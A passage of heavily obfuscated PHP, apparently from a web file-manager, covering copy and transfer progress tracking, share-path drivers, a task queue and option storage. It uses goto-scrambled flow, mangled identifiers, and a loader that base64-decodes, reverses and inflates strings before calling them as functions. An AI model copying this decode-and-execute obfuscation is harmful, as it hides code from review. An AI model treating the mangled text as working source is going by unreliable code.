($this->sourceModelCopyFlag) { return; } if ($É¯ú¸ªª[$„¥½¸‘¨[1695]] == $„¥½¸‘¨[1286]) { return; } self::updateTask($É¯ú¸ªª); } private static function updateTask(&$Ò»¥¹Ïæ) { $ğÀã÷Û… =& $_SERVER[® ¨Ä®ñ]; if ($Ò»¥¹Ïæ[$ğÀã÷Û…[1695]] == $ğÀã÷Û…[1181] || $Ò»¥¹Ïæ[$ğÀã÷Û…[1695]] == $ğÀã÷Û…[108]) { if ($Ò»¥¹Ïæ[$ğÀã÷Û…[1689]]) { $Ò»¥¹Ïæ[$ğÀã÷Û…[1692]] = $Ò»¥¹Ïæ[$ğÀã÷Û…[1691]] + $Ò»¥¹Ïæ[$ğÀã÷Û…[1688]]; } } else { if ($Ò»¥¹Ïæ[$ğÀã÷Û…[1695]] == $ğÀã÷Û…[1287]) { if ($Ò»¥¹Ïæ[$ğÀã÷Û…[1689]] == $ğÀã÷Û…[1181]) { $Ò»¥¹Ïæ[$ğÀã÷Û…[1692]] = $Ò»¥¹Ïæ[$ğÀã÷Û…[1691]] + $Ò»¥¹Ïæ[$ğÀã÷Û…[1688]] * 0.5; } else { if ($Ò»¥¹Ïæ[$ğÀã÷Û…[1689]] == $ğÀã÷Û…[108]) { $Ò»¥¹Ïæ[$ğÀã÷Û…[1692]] = $Ò»¥¹Ïæ[$ğÀã÷Û…[1691]] + $Ò»¥¹Ïæ[$ğÀã÷Û…[1687]] * 0.5 + $Ò»¥¹Ïæ[$ğÀã÷Û…[1688]] * 0.5; } } } } $Ò»¥¹Ïæ[$ğÀã÷Û…[1641]] = $Ò»¥¹Ïæ[$ğÀã÷Û…[1692]] / $Ò»¥¹Ïæ[$ğÀã÷Û…[745]]; if ($Ò»¥¹Ïæ[$ğÀã÷Û…[1641]] > 0) { $ÂÏ±´¡ = timeFloat() - $Ò»¥¹Ïæ[$ğÀã÷Û…[1643]] - $Ò»¥¹Ïæ[$ğÀã÷Û…[1646]]; $Ò»¥¹Ïæ[$ğÀã÷Û…[1647]] = $ÂÏ±´¡ * (1 - $Ò»¥¹Ïæ[$ğÀã÷Û…[1641]]) / $Ò»¥¹Ïæ[$ğÀã÷Û…[1641]]; } } public function addPath($²±Ñ¾¤) { $œ›šÆê³ =& $_SERVER[® ¨Ä®ñ]; if (!$²±Ñ¾¤) { return; } $˜Ï¬ÖÙı =& $this->task; $ŒÂµŸÁÄ = IO::infoWithChildren($²±Ñ¾¤); $„¤ˆ’„ = $˜Ï¬ÖÙı[$œ›šÆê³[1696]] ? $˜Ï¬ÖÙı[$œ›šÆê³[1696]][$œ›šÆê³[1697]] : 0; $˜Ï¬ÖÙı[$œ›šÆê³[1696]] = array($œ›šÆê³[1697] => $„¤ˆ’„ + 1, $œ›šÆê³[412] => $ŒÂµŸÁÄ[$œ›šÆê³[32]], $œ›šÆê³[78] => $ŒÂµŸÁÄ[$œ›šÆê³[78]], $œ›šÆê³[510] => $ŒÂµŸÁÄ[$œ›šÆê³[510]] ? $ŒÂµŸÁÄ[$œ›šÆê³[510]] : $ŒÂµŸÁÄ[$œ›šÆê³[78]]); if ($ŒÂµŸÁÄ[$œ›šÆê³[33]] == $œ›šÆê³[192]) { $˜Ï¬ÖÙı[$œ›šÆê³[768]] += 1; } else { $˜Ï¬ÖÙı[$œ›šÆê³[768]] += $ŒÂµŸÁÄ[$œ›šÆê³[83]][$œ›šÆê³[81]]; if ($ŒÂµŸÁÄ[$œ›šÆê³[394]]) { $˜Ï¬ÖÙı[$œ›šÆê³[768]] += $ŒÂµŸÁÄ[$œ›šÆê³[83]][$œ›šÆê³[82]] + 1; } } $˜Ï¬ÖÙı[$œ›šÆê³[745]] += $ŒÂµŸÁÄ[$œ›šÆê³[80]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($—ã½³¤°) { $º‹Ï×‹Œ =& $_SERVER[® ¨Ä®ñ]; $¸ËıâñÖ =& $this->task; $¸ËıâñÖ[$º‹Ï×‹Œ[1685]] = $—ã½³¤°[$º‹Ï×‹Œ[32]]; $¸ËıâñÖ[$º‹Ï×‹Œ[1048]] = $—ã½³¤°[$º‹Ï×‹Œ[32]]; $this->update(); } public function copyFileStart($î®íÌ£á, $Ø‹ê×Öõ, $§Ş ˆ»Ğ, $ìÍß¿š, $Ò¿§£Ş˜, $å™şÑ·¨) { $£³–«‰Ş =& $_SERVER[® ¨Ä®ñ]; $ÔÛ…³è­ = $Ò¿§£Ş˜; if ($ÔÛ…³è­ == $GLOBALS[$£³–«‰Ş[1698]]) { $ÔÛ…³è­ = $GLOBALS[$£³–«‰Ş[1699]]; } $GLOBALS[$£³–«‰Ş[1699]] = $Ò¿§£Ş˜; $GLOBALS[$£³–«‰Ş[1698]] = $å™şÑ·¨; $àÂ®Õçº =& $this->task; $àÂ®Õçº[$£³–«‰Ş[1685]] = $ÔÛ…³è­; $àÂ®Õçº[$£³–«‰Ş[1687]] = (int) $î®íÌ£á->size($Ø‹ê×Öõ); $àÂ®Õçº[$£³–«‰Ş[1688]] = 0; $àÂ®Õçº[$£³–«‰Ş[1048]] = $£³–«‰Ş[12]; $àÂ®Õçº[$£³–«‰Ş[1689]] = $£³–«‰Ş[12]; $àÂ®Õçº[$£³–«‰Ş[1690]] = 0; $Ñ›¢ ˜Ö = $àÂ®Õçº[$£³–«‰Ş[1687]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($àÂ®Õçº[$£³–«‰Ş[392]] . $£³–«‰Ş[1700]); if ($Ñ›¢ ˜Ö && file_exists(get_path_father($ìÍß¿š))) { Cache::set($àÂ®Õçº[$£³–«‰Ş[392]] . $£³–«‰Ş[1700], $ìÍß¿š); $àÂ®Õçº[$£³–«‰Ş[1661]] = array($£³–«‰Ş[1701], $£³–«‰Ş[1702]); } $this->update(0, $Ñ›¢ ˜Ö); } public static function updateCopyLocalFileSize($¾‡õïğ) { $€›Æü‹ğ =& $_SERVER[® ¨Ä®ñ]; $Í¯Á¬à = Cache::get($¾‡õïğ[$€›Æü‹ğ[392]] . $€›Æü‹ğ[1700]); if (!$Í¯Á¬à || !file_exists($Í¯Á¬à)) { return $¾‡õïğ; } $¾‡õïğ[$€›Æü‹ğ[1688]] = @filesize($Í¯Á¬à); $¾‡õïğ[$€›Æü‹ğ[1692]] += $¾‡õïğ[$€›Æü‹ğ[1688]]; self::updateTask($¾‡õïğ); return $¾‡õïğ; } public function copyFileEnd($ì±˜äš×, $İæ…¨óª, $”‹ĞƒÚ, $ô½ı½ , $áù—¹Î, $Ñü–³ğ«) { $íšš° =& $_SERVER[® ¨Ä®ñ]; $ù¼Ä”ü =& $this->task; $ù¼Ä”ü[$íšš°[1688]] = $ù¼Ä”ü[$íšš°[1687]]; $ù¼Ä”ü[$íšš°[1689]] = $íšš°[12]; unset($ù¼Ä”ü[$íšš°[1661]]); if ($áù—¹Î == $ù¼Ä”ü[$íšš°[1685]]) { $ù¼Ä”ü[$íšš°[1691]] += $ù¼Ä”ü[$íšš°[1687]]; $ù¼Ä”ü[$íšš°[1692]] = $ù¼Ä”ü[$íšš°[1691]]; $this->update(1); } else { $this->update(); $ù¼Ä”ü[$íšš°[1688]] = 0; } Cache::remove($ù¼Ä”ü[$íšš°[392]] . $íšš°[1700]); self::log($íšš°[1703] . $İæ…¨óª . $íšš°[70] . $ô½ı½  . $íšš°[226] . $áù—¹Î . $íšš°[1704] . $ù¼Ä”ü[$íšš°[1685]]); } public function updateFileEnd($§¦¨Ä”, $îıâ‚ï) { $îóğñÛ– =& $_SERVER[® ¨Ä®ñ]; $œÑËèË =& $this->task; $œÑËèË[$îóğñÛ–[1685]] = $§¦¨Ä”; $œÑËèË[$îóğñÛ–[1687]] = $îıâ‚ï; $œÑËèË[$îóğñÛ–[1691]] += $îıâ‚ï; $œÑËèË[$îóğñÛ–[1692]] = $œÑËèË[$îóğñÛ–[1691]]; $this->update(1); self::log($îóğñÛ–[1705] . $§¦¨Ä”); } public function sourceModelCopy($Ğ÷‘ƒ­) { $÷­ƒ =& $_SERVER[® ¨Ä®ñ]; $Ë§Æ‚¶ = $Ğ÷‘ƒ­[0]; $Ğ©âùŒ = $Ğ÷‘ƒ­[1]; $Ü©‰§Ö– =& $this->task; $this->sourceModelCopyFlag = !0; $¤†Å˜ = 0; switch ($Ë§Æ‚¶) { case $÷­ƒ[557]: $¤†Å˜ = 1; break; case $÷­ƒ[560]: $Ü©‰§Ö–[$÷­ƒ[1685]] = $Ğ©âùŒ[$÷­ƒ[32]]; break; case $÷­ƒ[562]: $¤†Å˜ = intval($Ğ÷‘ƒ­[$÷­ƒ[375]] * 0.4); break; case $÷­ƒ[564]: $¤†Å˜ = intval($Ğ÷‘ƒ­[$÷­ƒ[375]] * 0.2); break; case $÷­ƒ[566]: $¤†Å˜ = intval($Ğ÷‘ƒ­[$÷­ƒ[375]] * 0.4); break; } $this->update($¤†Å˜); $this->sourceModelCopyFlag = !1; } public function sourceRemove($İ·ã‚¡¿, $…š¸â¯) { $ƒã’ŠŒü =& $_SERVER[® ¨Ä®ñ]; $this->sourceModelCopyFlag = !0; $ø‰¿©€š = 1; if (isset($İ·ã‚¡¿[$ƒã’ŠŒü[83]])) { $ø‰¿©€š = $İ·ã‚¡¿[$ƒã’ŠŒü[83]][$ƒã’ŠŒü[81]] + $İ·ã‚¡¿[$ƒã’ŠŒü[83]][$ƒã’ŠŒü[82]] + 1; } $this->update($ø‰¿©€š); $this->sourceModelCopyFlag = !1; } public function sourceMove($‰Â“Ó‰ö) { $this->sourceRemove($‰Â“Ó‰ö, !1); } public function curlProgress($ïøº»Îé, $Ä¯•ºü, $Ìå­› , $‡ÅêÜéÖ, $ù÷…½Ã‹) { $ÛÄİ‚Ì =& $_SERVER[® ¨Ä®ñ]; $«åÌ =& $this->task; if ($ù÷…½Ã‹ > 0) { $«åÌ[$ÛÄİ‚Ì[1048]] = $ÛÄİ‚Ì[1706]; $«åÌ[$ÛÄİ‚Ì[1689]] = $ÛÄİ‚Ì[108]; if ($«åÌ[$ÛÄİ‚Ì[1687]]) { $«åÌ[$ÛÄİ‚Ì[1688]] = $ù÷…½Ã‹; } if ($«åÌ[$ÛÄİ‚Ì[1690]]) { $«åÌ[$ÛÄİ‚Ì[1688]] = $ù÷…½Ã‹ + $«åÌ[$ÛÄİ‚Ì[1690]]; } } else { if ($Ìå­›  > 0) { if ($«åÌ[$ÛÄİ‚Ì[1687]] == $Ä¯•ºü) { $«åÌ[$ÛÄİ‚Ì[1688]] = $Ìå­› ; $«åÌ[$ÛÄİ‚Ì[1048]] = $ÛÄİ‚Ì[1707]; $«åÌ[$ÛÄİ‚Ì[1689]] = $ÛÄİ‚Ì[1181]; } } } $this->update(); } public function curlProgressStart($ÃËåÎ©ƒ) { } public function curlProgressEnd($úû–Ä¬) { $ °ŞÈà‰ =& $_SERVER[® ¨Ä®ñ]; $Â»­éâ­ =& $this->task; $æö“‹áÇ = curl_getinfo($úû–Ä¬); $Ê‘ßÄ¬ = $æö“‹áÇ[$ °ŞÈà‰[1708]]; if ($Ê‘ßÄ¬ == -1) { $Ê‘ßÄ¬ = $æö“‹áÇ[$ °ŞÈà‰[1709]]; } if ($Â»­éâ­[$ °ŞÈà‰[1689]] == $ °ŞÈà‰[108] && $Ê‘ßÄ¬) { $Â»­éâ­[$ °ŞÈà‰[1690]] += $Ê‘ßÄ¬; } $this->update(); } } goto AŒÂ»’ãŠ˜; Eì«Ÿ‘«„±: class PathDriverDriverShareItem { public function __construct($ğ¿å‚îŠ) { $this->pathParse = $ğ¿å‚îŠ; } public function __call($Ÿ»·‚êã, $Ş¡›ã‚‹) { $ÄßŸ¼É =& $_SERVER[® ¨Ä®ñ]; if (method_exists($this, $Ÿ»·‚êã)) { return; } $Æ§»½ü€ = call_user_func_array(array($ÄßŸ¼É[1319], $Ÿ»·‚êã), $Ş¡›ã‚‹); $şÎ‰¶½¤ = array($ÄßŸ¼É[1320], $ÄßŸ¼É[1321], $ÄßŸ¼É[1322], $ÄßŸ¼É[1323], $ÄßŸ¼É[540], $ÄßŸ¼É[542], $ÄßŸ¼É[1324], $ÄßŸ¼É[108], $ÄßŸ¼É[1325], $ÄßŸ¼É[1326]); if (in_array($Ÿ»·‚êã, $şÎ‰¶½¤)) { $Æ§»½ü€ = $this->getPathOuter($Æ§»½ü€); } return $Æ§»½ü€; } public function copy($“œ£æà·, $ß™¨ïõõ, $ó¤İã¯ = false, $Å£§Ë½ = false) { return $this->copyMove($“œ£æà·, $ß™¨ïõõ, $ó¤İã¯, $_SERVER[® ¨Ä®ñ][540], $Å£§Ë½); } public function move($¢£ú¥ü, $ßì®Ñ†ã, $‰™ÆŞÒ¾ = false, $ş÷µ½ñÛ = false) { return $this->copyMove($¢£ú¥ü, $ßì®Ñ†ã, $‰™ÆŞÒ¾, $_SERVER[® ¨Ä®ñ][542], $ş÷µ½ñÛ); } private function copyMove($¶™ƒº¦à, $ùÔŞ¿ã¾, $üÜù èò, $ÄÅÆ½Ñ, $¥¦èœê÷ = false) { $¬åŒÙØ‘ =& $_SERVER[® ¨Ä®ñ]; $Œ²òÊË = $ùÔŞ¿ã¾; $œñå·æ = IO::driverMake($ùÔŞ¿ã¾); if ($œñå·æ->pathParse[$¬åŒÙØ‘[1135]]) { $ùÔŞ¿ã¾ = $œñå·æ->pathParse[$¬åŒÙØ‘[1135]]; } else { $ùÔŞ¿ã¾ = $Œ²òÊË; } $ÑşóÇ° = IO::copyMove($¶™ƒº¦à, $ùÔŞ¿ã¾, $üÜù èò, $ÄÅÆ½Ñ, $¥¦èœê÷); $ÑşóÇ° = $this->getPathOuter($ÑşóÇ°); return $ÑşóÇ°; } public function pathThis($Àâô°ø™) { return get_path_this($this->pathParse[$_SERVER[® ¨Ä®ñ][78]]); } public function pathFather($ûÚ¦“üı) { return get_path_father($this->pathParse[$_SERVER[® ¨Ä®ñ][78]]); } public function iconvSystem($úŠŞ) { return $úŠŞ; } protected function infoParse($Ô”‚®é, $¥Ê›øú  = false) { $Ü ¬÷Šú =& $_SERVER[® ¨Ä®ñ]; $óéšÌıÅ = $this->pathParse[$Ü ¬÷Šú[477]][$Ü ¬÷Šú[1158]] . $this->pathParse[$Ü ¬÷Šú[1151]]; if ($¥Ê›øú ) { $Ã«ñéÖˆ = IO::infoWithChildren($óéšÌıÅ); } else { $Ã«ñéÖˆ = IO::info($óéšÌıÅ); } $±î¹”¯ = $this->pathParse[$Ü ¬÷Šú[477]]; return Action($Ü ¬÷Šú[1317])->_shareItemeParse($Ã«ñéÖˆ, $±î¹”¯); } public function listAll($ØÜ êØ˜) { $æº»«ñù =& $_SERVER[® ¨Ä®ñ]; $ã•Ö†±Ä = IO::listAll($ØÜ êØ˜); $Í«Ùªö = $this->pathParse[$æº»«ñù[477]]; foreach ($ã•Ö†±Ä as &$…½¬šªÌ) { check_abort(); $ôŸäóçø = IO::info($…½¬šªÌ[$æº»«ñù[78]]); $ôŸäóçø = is_array($ôŸäóçø) ? $ôŸäóçø : array(); $…½¬šªÌ = array_merge($ôŸäóçø, $…½¬šªÌ); $…½¬šªÌ[$æº»«ñù[87]] = Action($æº»«ñù[1317])->_shareItemeParse($…½¬šªÌ, $Í«Ùªö); } unset($…½¬šªÌ); return $ã•Ö†±Ä; } public function getPathOuter($ÄÊÍÔ’Ä) { $¥â†ï‘ª =& $_SERVER[® ¨Ä®ñ]; $è©í†—Õ = KodIO::parse($ÄÊÍÔ’Ä); if ($è©í†—Õ[$¥â†ï‘ª[33]] == KodIO::KOD_SHARE_ITEM) { return $è©í†—Õ[$¥â†ï‘ª[78]]; } $ÏÓÉˆ„° = KodIO::clear($ÄÊÍÔ’Ä); $ƒÕçÄµ¨ = KodIO::clear($this->pathParse[$¥â†ï‘ª[477]][$¥â†ï‘ª[1158]]); $»ŠüİÆù = substr($ÏÓÉˆ„°, strlen($ƒÕçÄµ¨)); if (substr($ÏÓÉˆ„°, 0, strlen($ƒÕçÄµ¨)) != $ƒÕçÄµ¨) { return !1; } return $this->pathParse[$¥â†ï‘ª[1152]] . $¥â†ï‘ª[8] . ltrim($»ŠüİÆù, $¥â†ï‘ª[8]); } public function getType() { $œ½™í‡„ =& $_SERVER[® ¨Ä®ñ]; $µëÍµø¬ = str_replace($œ½™í‡„[74], $œ½™í‡„[12], get_class($this)); return strtolower($µëÍµø¬); } public function isTypeObject($É›“ñœ¿) { return IO::isTypeObject($É›“ñœ¿); } public function info($ã¦¾êÉ¬) { return $this->infoParse($ã¦¾êÉ¬); } public function infoAuth($ãÎ¢ñù) { return $this->infoParse($ãÎ¢ñù); } public function infoWithChildren($¦ÓÅ©©) { return $this->infoParse($¦ÓÅ©©, !0); } public function infoFull($óçğ‚İ) { return $this->infoParse($óçğ‚İ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÒİÓßì) { $this->pathParse = $ÒİÓßì; } protected function infoParse($ŠÒÅ¹ÄÍ, $áê¬ßï = false) { $Æ²Ú‚õÑ =& $_SERVER[® ¨Ä®ñ]; return Action($Æ²Ú‚õÑ[1157])->sharePathInfo($this->pathParse[$Æ²Ú‚õÑ[78]], !0, $áê¬ßï); } public function listPath($á ãşµ, $ƒÔª¹· = false) { $Î¨Õ‡ˆÛ =& $_SERVER[® ¨Ä®ñ]; $¼£…œ¶¡ = IO::listPath($á ãşµ, $ƒÔª¹·); if (!$¼£…œ¶¡) { return $¼£…œ¶¡; } if (is_array($¼£…œ¶¡[$Î¨Õ‡ˆÛ[1318]])) { $üÃ Ûú• = Action($Î¨Õ‡ˆÛ[1327])->parsePathChildren($¼£…œ¶¡[$Î¨Õ‡ˆÛ[1318]], array($Î¨Õ‡ˆÛ[413] => $á ãşµ)); $¼£…œ¶¡[$Î¨Õ‡ˆÛ[1318]] = Action($Î¨Õ‡ˆÛ[1157])->shareItemInfo($üÃ Ûú•); } foreach ($¼£…œ¶¡ as $äòùÜäí => $óôØıßÒ) { if (!in_array($äòùÜäí, array($Î¨Õ‡ˆÛ[76], $Î¨Õ‡ˆÛ[77]))) { continue; } foreach ($óôØıßÒ as $£ñ°¨„Ë => $üÃ Ûú•) { $üÃ Ûú• = Action($Î¨Õ‡ˆÛ[1327])->parsePathChildren($üÃ Ûú•, array($Î¨Õ‡ˆÛ[413] => $á ãşµ)); $¼£…œ¶¡[$äòùÜäí][$£ñ°¨„Ë] = Action($Î¨Õ‡ˆÛ[1157])->shareItemInfo($üÃ Ûú•); } } return $¼£…œ¶¡; } public function listAll($·¾°î è) { $¯€îıÌı =& $_SERVER[® ¨Ä®ñ]; $‹Åş¶šÜ = IO::listAll($·¾°î è); foreach ($‹Åş¶šÜ as &$ô™ï Ğ) { $ıÑÓûÅ— = IO::info($ô™ï Ğ[$¯€îıÌı[78]]); $ıÑÓûÅ— = is_array($ıÑÓûÅ—) ? $ıÑÓûÅ— : array(); $ô™ï Ğ = array_merge($ıÑÓûÅ—, $ô™ï Ğ); $ô™ï Ğ[$¯€îıÌı[87]] = Action($¯€îıÌı[1157])->shareItemInfo($ô™ï Ğ); } unset($ô™ï Ğ); return $‹Åş¶šÜ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($Øàí·á) { parent::__construct($Øàí·á); } } goto e•æÜ¥‰Óª; a÷ ¿ô¸Ô: $fileSize = strrev(base64_decode($_SERVER[„ãÉ‘§›][0])); function binCheckNeq($¶û¶±ü„, $ºà§öÖÈ) { return $¶û¶±ü„ != $ºà§öÖÈ; } $_SERVER[$_SERVER[„ãÉ‘§›][1]] = $fileSize($_SERVER[$_SERVER[„ãÉ‘§›][2]]); goto CÇ¿ÈĞ»Í; e˜²ğ…Ö…: define($_SERVER[® ¨Ä®ñ][595], $_SERVER[® ¨Ä®ñ][596]); $gszjopanuh = $_SERVER[® ¨Ä®ñ][597]; $_SERVER[û„Ñáçœ] = explode($_SERVER[® ¨Ä®ñ][598], gzinflate(substr($_SERVER[® ¨Ä®ñ][599], 10, -8))); goto E½Û“Â—õ‰; AŒÂ»’ãŠ˜: class TaskHttp extends Task { protected function startAfter() { $³‡ ¦ò— =& $_SERVER[® ¨Ä®ñ]; $á×İŞ‹à =& $this->task; $á×İŞ‹à[$³‡ ¦ò—[1710]] = 1; Hook::bind($³‡ ¦ò—[1679], array($this, $³‡ ¦ò—[1711])); Hook::bind($³‡ ¦ò—[1681], array($this, $³‡ ¦ò—[1712])); Hook::bind($³‡ ¦ò—[1683], array($this, $³‡ ¦ò—[1713])); } protected function endAfter() { $„¨±¡É =& $_SERVER[® ¨Ä®ñ]; Hook::unbind($„¨±¡É[1679], array($this, $„¨±¡É[1711])); Hook::unbind($„¨±¡É[1681], array($this, $„¨±¡É[1712])); Hook::unbind($„¨±¡É[1683], array($this, $„¨±¡É[1713])); } public function progressStart($İùñŞØ¤) { $¼ÓÏã÷™ =& $_SERVER[® ¨Ä®ñ]; $¾Ü‡ˆÇ = curl_getinfo($İùñŞØ¤); self::log($¼ÓÏã÷™[1714] . $¾Ü‡ˆÇ[$¼ÓÏã÷™[302]]); self::valueSet($this->task[$¼ÓÏã÷™[392]], $this->task); } public function progressEnd($ÀøıéŸ) { $À·ñŞíÌ =& $_SERVER[® ¨Ä®ñ]; self::log($À·ñŞíÌ[1715] . $this->task[$À·ñŞíÌ[392]]); $this->end(); } public function progress($ËÇ†êÜÜ, $«œ–ÍÎê, $ĞåÒÂƒé, $åıÌÆË¹, $ºŸ¾Ğ¦°) { $ˆŒ÷¡¾« =& $_SERVER[® ¨Ä®ñ]; $ ëòïœ =& $this->task; if ($ºŸ¾Ğ¦° > 0) { $ ëòïœ[$ˆŒ÷¡¾«[768]] = $ ëòïœ[$ˆŒ÷¡¾«[768]] == 0 ? $åıÌÆË¹ : $ ëòïœ[$ˆŒ÷¡¾«[768]]; $ ëòïœ[$ˆŒ÷¡¾«[1640]] = $ºŸ¾Ğ¦°; } else { if ($ĞåÒÂƒé > 0) { $ ëòïœ[$ˆŒ÷¡¾«[768]] = $ ëòïœ[$ˆŒ÷¡¾«[768]] == 0 ? $«œ–ÍÎê : $ ëòïœ[$ˆŒ÷¡¾«[768]]; $ ëòïœ[$ˆŒ÷¡¾«[1640]] = $ĞåÒÂƒé; } } $this->update(); self::log("\x70\x72\157\x67\x72\x65\163\163\110\x74\164\160\x3a\x64\157\x77\156\72{$ĞåÒÂƒé}\x2f{$«œ–ÍÎê}\73\x20\165\160\x6c\157\x61\x64\72{$ºŸ¾Ğ¦°}\x2f{$åıÌÆË¹}\73"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\121\165\x65\x75\x65\x4c\x65\x6e\x67\164\x68"; const QUEUE_DATA = "\164\x61\x73\153\x51\165\x65\165\145\x44\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($’İ“ŒÖŞ, $«Ìñª = array(), $·ÈŒ¿†Ä = '', $šÚ¹³×Ö = '') { $÷àäÁ‡ =& $_SERVER[® ¨Ä®ñ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($šÚ¹³×Ö && array_find_by_field(self::$listData, $÷àäÁ‡[95], $šÚ¹³×Ö)) { return !0; } self::$listData[] = array($÷àäÁ‡[259] => $’İ“ŒÖŞ, $÷àäÁ‡[1716] => $«Ìñª, $÷àäÁ‡[442] => $·ÈŒ¿†Ä, $÷àäÁ‡[95] => $šÚ¹³×Ö); return !0; } public static function addSubmit() { $ìÊšµ¦Š =& $_SERVER[® ¨Ä®ñ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($ìÊšµ¦Š[1717] . json_encode_force(array_to_keyvalue(self::$listData, $ìÊšµ¦Š[12], $ìÊšµ¦Š[442])), $ìÊšµ¦Š[1718]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($€áå‚®, $ŒÈå²²… = array(), $¨š¡Ê‰“ = '', $ÃøãÉ›â = '') { $ùéØ•õ =& $_SERVER[® ¨Ä®ñ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ğµœŸÑë = self::getAll(); if ($ÃøãÉ›â && array_find_by_field($ğµœŸÑë, $ùéØ•õ[95], $ÃøãÉ›â)) { return !0; } $ğµœŸÑë[] = array($ùéØ•õ[259] => $€áå‚®, $ùéØ•õ[1716] => $ŒÈå²²…, $ùéØ•õ[442] => $¨š¡Ê‰“, $ùéØ•õ[95] => $ÃøãÉ›â); write_log($ùéØ•õ[1717] . $¨š¡Ê‰“, $ùéØ•õ[1718]); self::setAll($ğµœŸÑë); return !0; } public static function run() { $¼ÆÂ¥ñ =& $_SERVER[® ¨Ä®ñ]; $š‡†ùİ» = self::getAll(); $”³µœ¾à = array_shift($š‡†ùİ»); if (!$”³µœ¾à) { return !1; } self::setAll($š‡†ùİ»); $Î¡µÍŒĞ = timeFloat(); try { Hook::apply($”³µœ¾à[$¼ÆÂ¥ñ[259]], $”³µœ¾à[$¼ÆÂ¥ñ[1716]]); } catch (Exception $õÆ†İªÄ) { } $Á„ßËú‘ = number_format(timeFloat() - $Î¡µÍŒĞ, 3) . $¼ÆÂ¥ñ[1655]; write_log($¼ÆÂ¥ñ[1719] . $”³µœ¾à[$¼ÆÂ¥ñ[442]] . $¼ÆÂ¥ñ[1720] . $Á„ßËú‘, $¼ÆÂ¥ñ[1718]); return !0; } public static function count() { $™æÏ†Šª = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$™æÏ†Šª) { return 0; } return intval($™æÏ†Šª); } public static function getAll() { $ˆÏ¨±·ü = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ˆÏ¨±·ü) { return array(); } return $ˆÏ¨±·ü; } public static function setAll($í¤Æ™ ) { $Í Ş³²ü = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($í¤Æ™ ), $Í Ş³²ü); Cache::set(self::QUEUE_DATA, $í¤Æ™ , $Í Ş³²ü); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } $_file = $_SERVER[$_SERVER[® ¨Ä®ñ][943]]; goto DˆÀê†Í–¬; c¿‘¿Ô¿íŸ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($é½†Ë– = false, $¨öÌ˜“ = '', $ÌÁµĞ§Î = false) { $‚óââ« =& $_SERVER[® ¨Ä®ñ]; $×…ı¸÷˜ = $this->cacheGet($¨öÌ˜“); $²›ÊôØÌ = $this->optionDefault($¨öÌ˜“); $²›ÊôØÌ = is_array($²›ÊôØÌ) ? $²›ÊôØÌ : array(); if (is_array($×…ı¸÷˜)) { $×…ı¸÷˜ = array_merge($²›ÊôØÌ, $×…ı¸÷˜); return $é½†Ë– ? isset($×…ı¸÷˜[$é½†Ë–]) ? $×…ı¸÷˜[$é½†Ë–] : null : $×…ı¸÷˜; } $÷ÉÚâİú = $this->filterWhere(array($‚óââ«[33] => $¨öÌ˜“)); $×…ı¸÷˜ = $this->where($÷ÉÚâİú)->select(); $×…ı¸÷˜ = array_to_keyvalue($×…ı¸÷˜, $‚óââ«[95], $‚óââ«[369]); foreach ($×…ı¸÷˜ as $î¸¶úï² => $Û²üí²…) { if ($ÌÁµĞ§Î || in_array($î¸¶úï², $this->jsonField)) { $×…ı¸÷˜[$î¸¶úï²] = json_decode($Û²üí²…, !0); } } $this->cacheSet($¨öÌ˜“, $×…ı¸÷˜); $×…ı¸÷˜ = array_merge($²›ÊôØÌ, $×…ı¸÷˜); return $é½†Ë– ? $×…ı¸÷˜[$é½†Ë–] : $×…ı¸÷˜; } public function set($è½³ñ¶Ç, $¼‡»ş‘ë = false, $•ŞÖ—ÉŞ = '') { $Ã“õ¾†™ =& $_SERVER[® ¨Ä®ñ]; $this->cacheRemove($•ŞÖ—ÉŞ); $ÛÀÄÅÅ˜ = array(); $‹ÑØ‘Ş× = is_array($è½³ñ¶Ç) ? $è½³ñ¶Ç : array($è½³ñ¶Ç => $¼‡»ş‘ë); foreach ($‹ÑØ‘Ş× as $İ˜ç‡é“ => $ŸÙåÉ) { if (is_array($ŸÙåÉ)) { $ŸÙåÉ = json_encode_force($ŸÙåÉ); } $this->checkLength($ŸÙåÉ, !1, $this->tableName . $Ã“õ¾†™[4] . $è½³ñ¶Ç); $ŸÙåÉ = self::textEncode($ŸÙåÉ); $‹ÑØ‘Ş× = array($Ã“õ¾†™[33] => $•ŞÖ—ÉŞ, $Ã“õ¾†™[95] => $İ˜ç‡é“, $Ã“õ¾†™[369] => $ŸÙåÉ); $ÛÀÄÅÅ˜[] = $this->filterWhere($‹ÑØ‘Ş×); } if (!$ÛÀÄÅÅ˜) { return !0; } return $this->addAll($ÛÀÄÅÅ˜, array(), !0); } protected function optionDefault($ö¾ƒà±¼ = '') { return !1; } public function setDeep($ÙÑÁòç, $¦ ƒÃ«õ = false, $ª´¹ğ¨™ = '') { $Ä³®×  = explode($_SERVER[® ¨Ä®ñ][10], $ÙÑÁòç); $Ê¡¨†İÍ = $this->get(); array_set_value($Ê¡¨†İÍ, $ÙÑÁòç, $¦ ƒÃ«õ); $this->set($Ä³®× [0], $Ê¡¨†İÍ[$Ä³®× [0]], $ª´¹ğ¨™); } public function remove($èÊÖÃö, $İ–Şˆƒó = '') { $ËŞ¹ù•© =& $_SERVER[® ¨Ä®ñ]; $this->cacheRemove($İ–Şˆƒó); $˜³˜Ü®Œ = $this->filterWhere(array($ËŞ¹ù•©[95] => $èÊÖÃö, $ËŞ¹ù•©[33] => $İ–Şˆƒó)); if (is_null($èÊÖÃö)) { 